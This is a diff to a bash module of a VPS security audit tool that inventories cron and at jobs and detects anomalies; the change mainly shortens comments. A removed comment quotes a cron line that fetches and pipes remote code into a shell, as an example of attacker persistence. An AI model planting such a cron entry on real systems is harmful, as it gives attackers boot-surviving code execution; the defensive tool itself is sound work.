@@ -1,18 +1,8 @@
 #!/usr/bin/env bash
-# vpssec - VPS Security Check & Hardening Tool
-# Scheduling module — cron + at job inventory and anomaly detection
-# Copyright (c) 2024
-#
-# Why this module exists:
-# Lynis SCHD-* audit scheduled jobs. cron and at are classic supply-
-# chain and persistence vectors — a single `* * * * * curl host/x | sh`
-# in /etc/cron.d/ gives an attacker boot-survivable code execution.
-# vpssec's filesystem.sh covers cron-file *permissions* but never
-# inspects job *content*.
+# Scheduling module: cron and at job inventory plus anomaly detection.
+# Inspects job CONTENT; filesystem.sh covers cron-file permissions only.
 
-# ==============================================================================
-# Helpers
-# ==============================================================================
+# --- Helpers ---
 
 # Enumerate every cron entry vpssec can see. Output one entry per line,
 # tagged with its source. The source tag is part of the line so anomaly
@@ -75,9 +65,7 @@ _sched_list_at_jobs() {
     atq 2>/dev/null | awk '{print $1}'
 }
 
-# ==============================================================================
-# Audit
-# ==============================================================================
+# --- Audit ---
 
 scheduling_audit() {
     local module="scheduling"
@@ -165,9 +153,7 @@ _sched_audit_cron_anomalies() {
     fi
 }
 
-# ==============================================================================
-# Fix Functions — alert-only.
-# ==============================================================================
+# --- Fix Functions — alert-only. ---
 
 scheduling_fix() {
     local fix_id="$1"
